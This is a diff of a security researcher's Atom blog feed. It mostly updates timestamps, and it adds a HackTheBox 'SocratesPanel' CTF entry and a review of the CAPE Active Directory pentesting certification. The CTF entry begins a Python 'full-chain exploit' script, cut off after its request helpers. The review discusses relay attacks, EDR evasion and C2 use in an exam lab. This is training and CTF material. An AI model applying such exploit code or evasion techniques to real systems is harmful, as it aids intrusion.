@@ -5,7 +5,7 @@
   <subtitle>Offensive Security Researcher · Malware Developer &amp; Analyst · Exploit Developer · CTF Player</subtitle>
   <link href="http://localhost:4000/atom.xml" rel="self"/>
   <link href="http://localhost:4000/"/>
-  <updated>2026-07-12T00:36:37+02:00</updated>
+  <updated>2026-07-19T18:22:44+02:00</updated>
   <id>http://localhost:4000/</id>
   <author>
     <name>tralsesec</name>
@@ -29,7 +29,7 @@
     <title>CTF Writeups</title>
     
     <link href="http://localhost:4000/ctfs/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/ctfs/</id>
 
     
@@ -44,6 +44,102 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 
 &lt;div class=&quot;ctf-grid&quot;&gt;
 
+
+&lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
+  
+  &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
+    &lt;a href=&quot;/ctfs/htb-socratespanel/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/web_challenge.png&quot; alt=&quot;HackTheBox: SocratesPanel&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
+    &lt;div style=&quot;position: absolute; top: 1rem; right: 1.5rem; font-family: var(--font-mono); font-size: 0.65rem;&quot;&gt;
+      &lt;span style=&quot;
+        background: rgba(0,0,0,0.8);
+        border: 1px solid 
+        #ff4d4d
+        ;
+        
+        color: 
+        #ff4d4d
+        ;
+        
+        
+      &quot;&gt;
+        [HARD]
+      &lt;/span&gt;
+    &lt;/div&gt;
+
+    &lt;h2 style=&quot;margin: 0 0 1rem 0;&quot;&gt;&lt;a href=&quot;/ctfs/htb-socratespanel/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;HackTheBox: SocratesPanel&lt;/a&gt;&lt;/h2&gt;
+
+    &lt;div style=&quot;display: flex; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+      &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;PLATFORM:&lt;/span&gt; HackTheBox&lt;/span&gt;
+      &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TYPE:&lt;/span&gt; Challenge&lt;/span&gt;
+    &lt;/div&gt;
+
+    &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+      // Full-Chain Exploit. Writeup coming soon.
+
+    &lt;/div&gt;
+
+    &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Web
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Code-Review
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Race-Condition
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #HTML-Injection
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Reflective-XSS
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Redis
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SSRF
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Cache-Poisoning
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #CDN
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Parameter-Overshadowing
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Cross-Protocol-Smuggling
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Parameter-To-Header-Injection
+      &lt;/span&gt;
+      
+    &lt;/div&gt;
+
+    &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem;&quot;&gt;
+      &lt;a href=&quot;/ctfs/htb-socratespanel/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none;&quot;&gt;
+        READ_FULL_REPORT -&amp;gt;
+      &lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
@@ -2369,7 +2465,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     <title>AdonisJS BodyParser</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/9/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/9/</id>
 
     
@@ -2515,7 +2611,7 @@ module.exports = function() {
     <title>EternalBlue</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/8/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/8/</id>
 
     
@@ -2694,7 +2790,7 @@ module.exports = function() {
     <title>MongoBleed</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/7/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/7/</id>
 
     
@@ -2804,7 +2900,7 @@ module.exports = function() {
     <title>AsyncOS Quarantine Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/6/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/6/</id>
 
     
@@ -2915,7 +3011,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>FortiWeb Edge Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/5/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/5/</id>
 
     
@@ -3042,7 +3138,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>iOS26 &quot;Liquid Glass&quot; Exploitation Chain</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/4/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/4/</id>
 
     
@@ -3178,7 +3274,7 @@ The final flaw allows the attacker to escape the sandbox via an &lt;strong&gt;In
     <title>Firefox IPC Sandbox Escape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/3/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/3/</id>
 
     
@@ -3314,7 +3410,7 @@ Validating that an input is an “Integer” is insufficient when that integer c
     <title>Lazarus 0day (AppLocker LPE)</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/2/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/2/</id>
 
     
@@ -3414,7 +3510,7 @@ The driver accepted the IOCTL and processed the pointer regardless of the caller
     <title>The MAESTRO Breakout: ESXi Ring -1 Compromise</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/12/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/12/</id>
 
     
@@ -3680,7 +3776,7 @@ Finally, the ease with which the attackers bridged the gap from User Mode to Ker
     <title>PS5 Hypervisor Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/11/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/11/</id>
 
     
@@ -3872,7 +3968,7 @@ Software sandboxing is no longer sufficient for legacy compatibility layers.&lt;
     <title>N8scape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/10/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/10/</id>
 
     
@@ -4028,7 +4124,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>React2Shell RCE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/1/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/1/</id>
 
     
@@ -4137,7 +4233,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>Anatomy of a Bug</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/</id>
 
     
@@ -4311,7 +4407,7 @@ High-fidelity technical analyses of critical vulnerabilities, kernel exploits, a
     <title>Anatomy of a Bug - LICENSE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/LICENSE/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/LICENSE/</id>
 
     
@@ -4394,7 +4490,7 @@ f. &lt;strong&gt;Share&lt;/strong&gt; means to provide material to the public by
     <title>Projects</title>
     
     <link href="http://localhost:4000/projects/"/>
-    <updated>2026-07-12T00:36:37+02:00</updated>
+    <updated>2026-07-19T18:22:44+02:00</updated>
     <id>http://localhost:4000/projects/</id>
 
     
@@ -4793,6 +4889,296 @@ hr {
   </entry>
   
   <entry>
+    <title>CAPE Review: Conquering the Multi-Domain Active Directory Forest</title>
+    
+    <link href="http://localhost:4000/training/career/2026/07/19/cape-recap.html"/>
+    <updated>2026-07-19T18:22:00+02:00</updated>
+    <id>http://localhost:4000/training/career/2026/07/19/cape-recap.html</id>
+
+    
+    
+      <category term="System Log" label="SysLog" />
+    
+    
+    <content type="html">&lt;p&gt;The Hack The Box Certified Active Directory Pentesting Expert (CAPE) is officially done.&lt;/p&gt;
+
+&lt;p&gt;Let’s skip the standard introduction. If you are reading this, you already know what Active Directory is and why enterprise security revolves around it. Instead of rehashing basic course syllabi, I want to give you an honest look at what it takes to go through the grueling training path, survive a heavily defended multi-forest exam environment, and compile a massive commercial-grade engineering dossier.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-htb-academy-the-complete-ad-blueprint&quot;&gt;The HTB Academy: The Complete AD Blueprint&lt;/h3&gt;
+
+&lt;p&gt;The academic path behind this certification is an absolute mountain of information. It leaves no stone unturned. The material systematically builds your foundational knowledge up to an expert engineering baseline, covering everything from core protocol mechanics to advanced domain exploitation.&lt;/p&gt;
+
+&lt;p&gt;The curriculum gives you total coverage on:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;The Fundamentals:&lt;/strong&gt; Masterful command over tools like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx&lt;/code&gt; to execute targeted link-layer attacks.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Protocol Transition &amp;amp; Relay Loops:&lt;/strong&gt; In-depth mechanics handling same-protocol and cross-protocol relay configurations.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Access Control Exploitation:&lt;/strong&gt; Deep parsing of Discretionary Access Control Lists (DACLs) to map, abuse, and overwrite over-privileged object permissions.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Forest Subversion:&lt;/strong&gt; Complex cross-forest attack vectors designed to systematically dismantle bidirectional trust boundaries.&lt;/li&gt;
+  &lt;li&gt;and way more..&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To be completely fair, some modules can feel incredibly wordy or slightly too drawn out for my taste when explaining straightforward concepts. However, Hack The Box introduced a phenomenal quality-of-life feature: the AI “HTB Coach.” Whenever a section felt bogged down in text text text, I used the coach to summarize concepts and explain specific protocol interactions. It works remarkably well and keeps your learning momentum moving forward.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-exam-environment-subnets-pivots-and-stealth&quot;&gt;The Exam Environment: Subnets, Pivots, and Stealth&lt;/h3&gt;
+
+&lt;p&gt;The practical engagement phase is challenging, but not in the chaotic, logic-defying way some exams tend to be. Where certifications like CPTS or CWEE might test your patience with creative vector guessing games, CAPE is pure, clinical Active Directory. The network paths are highly clear, logical, and structured. If you possess a deep structural understanding of AD architecture and an intuitive feel for how real-world corporate networks are laid out in the background, this exam is the ultimate validation of your skills.&lt;/p&gt;
+
+&lt;p&gt;The staging layout drops you into a massive enterprise forest spanning 3 completely distinct network subnets. Each environment is fully built out with its own dedicated servers, standalone workstations, users, and master domain controllers. Your job is to completely compromise the active layer, establish secure persistence nodes, and use those footholds to pivot deeper into the next security zone.&lt;/p&gt;
+
+&lt;p&gt;The real kicker? &lt;strong&gt;The background environment is packed with aggressive AV/EDR solutions.&lt;/strong&gt; You cannot just blindly drop noisy public payloads onto a host and hope for a quick session check-in. Bypassing these boundaries requires preparation. You need to come into the trenches with pre-compiled, tested payloads that can be dragged and dropped into memory without raising immediate security telemetry flags.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-deliverable-a-320-page-technical-monster&quot;&gt;The Deliverable: A 320-Page Technical Monster&lt;/h3&gt;
+
+&lt;p&gt;If you think the exploitation phase is demanding, wait until you face the reporting queue. I ended up delivering a comprehensive, commercial-grade assessment report that reached an absolute unit of 320 pages. To be fair, there are people who passed with around 100 pages. But we’re not normal, we strive for perfection gng.&lt;/p&gt;
+
+&lt;p&gt;Just like my previous engagements, my documentation strategy relied entirely on parallel live logging. Every compromised computer object, mutated group parameter, or exfiltrated hash was instantly screenshotted and written directly into SysReptor as a finished finding.&lt;/p&gt;
+
+&lt;p&gt;The timeline and review speed from the grading engine were incredibly impressive. I submitted the PDF on a Friday evening. Naturally, nothing moves over the weekend, but I received my official “Passed” confirmation email on Wednesday afternoon. The grading team efficiently audited a 320-page document in exactly 3 working days maintaining a staggering pace of roughly 100 pages indexed per day. Respect.&lt;/p&gt;
+
+&lt;p&gt;I also got some feedback. And to be completely honest, it feels like they have a couple of templates going on because I absolutely &lt;strong&gt;did&lt;/strong&gt; add comments on every command input, output and image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/cape-exam-feedback.png&quot; alt=&quot;cape-exam-feedback&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;operational-tips-for-the-trenches&quot;&gt;Operational Tips for the Trenches&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Harden Your Evader Toolset:&lt;/strong&gt; Spend quality time inside your local lab testing payload execution against modern endpoint defenses. Having clean tools ready for runtime deployment saves you an immense amount of stress when jumping hosts. I used Mythic C2 btw.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Map out Trust Infrastructure:&lt;/strong&gt; Do not rush your enumeration phase. Use visual access graphs to carefully track domain boundaries, bidirectional forest trusts, and implicit inheritance links across the subnets.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Build Bulletproof Pivot Notes:&lt;/strong&gt; Given the multi-tiered layout of the environment, a network reset or machine reboot can quickly scramble your active sessions. Document your transport layers so clearly that you can re-verify your path back to any tier in minutes.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Don’t shy away from manual enumeration:&lt;/strong&gt; Multiple vulnerabilities could not be found by “just running bloodhound.” Often you will have to carefully look for and sort things by hand. Get used to it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;who-is-this-for&quot;&gt;Who Is This For?&lt;/h3&gt;
+
+&lt;p&gt;CAPE is arguably the most comprehensive and challenging pure On-Premises Active Directory certification on the market today. It literally covers every major enterprise vector and directory attack configuration in existence. If you want to master Windows protocols in depth, this is your gold standard.&lt;/p&gt;
+
+&lt;p&gt;However, you must keep realistic expectations regarding modern infrastructure requirements. Most contemporary enterprise environments have migrated away from isolated local infrastructures in favor of Hybrid AD and Azure cloud architectures. While the academy briefly touches on cloud frameworks near the end, it feels quite light and doesn’t dive deep enough into modern cloud exploitation.&lt;/p&gt;
+
+&lt;p&gt;To bridge that real-world visibility gap, you will definitely need to pair this knowledge with a dedicated cloud security track. That is exactly why my next engineering target is the CARTE.. and I am already planning out the exam and will drop a full review here once that cert is cleared, too.&lt;/p&gt;
+
+&lt;p&gt;Soon the CWEE review will drop and it will be interesting. Stay tuned.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>HackTheBox: SocratesPanel</title>
+    
+    <link href="http://localhost:4000/ctfs/htb-socratespanel/"/>
+    <updated>2026-07-13T00:00:00+02:00</updated>
+    <id>http://localhost:4000/ctfs/htb-socratespanel/</id>
+
+    
+    
+      <category term="Mission Log" label="CTF" />
+    
+    
+    <content type="html">&lt;p&gt;// Full-Chain Exploit. Writeup coming soon.&lt;/p&gt;
+
+&lt;p&gt;Full-Chain Exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib.parse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    Registers user and returns cookie. Fail = exit.
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/register&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 